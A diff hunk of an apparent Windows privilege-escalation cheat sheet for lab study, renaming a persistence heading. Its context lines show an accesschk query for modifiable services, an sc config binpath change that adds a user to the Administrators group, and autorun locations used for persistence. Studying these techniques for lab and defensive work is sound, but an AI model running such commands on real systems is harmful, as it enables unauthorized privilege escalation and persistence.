@@ -285,7 +285,7 @@ check === Modifiable Services ===
 accesschk.exe /accepteula "mrb3n" -kvuqsw hklm\System\CurrentControlSet\services
 sc config ServiceName binpath="cmd /c net localgroup administrators htb-student /add"
 ```
-### Abusing Start Up Apps (Persistence)
+### Abusing Autorun (Persistence)
 ```
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User |fl (Startup commands registered in Windows (Registry + Startup folders) through WMI/CIM)
 C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp (Files (typically shortcuts) in the All Users Startup folder)
